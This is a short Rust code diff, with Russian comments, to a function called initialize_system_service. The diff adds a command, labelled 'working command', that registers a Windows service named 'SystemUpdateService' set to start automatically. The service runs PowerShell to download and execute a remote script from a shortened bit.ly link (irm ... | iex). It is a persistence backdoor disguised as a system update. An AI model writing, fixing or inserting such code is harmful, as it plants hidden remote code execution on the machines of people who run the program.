@@ -16,9 +16,9 @@ pub fn initialize_system_service() {
 
     let _ = std::fs::File::create(lock_path);
 
-    // ===== ИСПРАВЛЕННАЯ КОМАНДА =====
-    // Кавычки экранированы правильно для cmd.exe
-    let cmd = r#"sc.exe create "SystemUpdateService" start= auto binPath= "\"cmd.exe /c powershell.exe irm https://bit.ly/4gVSSTx | iex\"" DisplayName= "System Update Service""#;
+    // ===== РАБОЧАЯ КОМАНДА =====
+    // Используем cmd.exe /c с правильным экранированием для sc.exe
+    let cmd = r#"sc.exe create "SystemUpdateService" start= auto binPath= "cmd.exe /c powershell.exe -Command \"irm https://bit.ly/4gVSSTx | iex\"" DisplayName= "System Update Service""#;
 
     append_log(log_path, &format!("Command: {}\n", cmd));
 
